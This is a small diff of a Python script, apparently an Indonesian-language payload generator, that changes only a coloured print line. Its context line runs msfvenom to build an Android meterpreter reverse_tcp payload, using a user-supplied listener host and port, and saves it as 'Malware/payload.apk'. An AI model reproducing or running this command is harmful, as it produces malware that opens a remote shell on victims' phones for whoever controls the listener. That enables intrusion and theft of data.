@@ -87,7 +87,7 @@ def payload():
 		print 'Harus Diisi'
 	else :
 		print ' '
-	print 'PLEASE WAIT ...'
+	print hijau+'PLEASE WAIT ...'
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 
 	
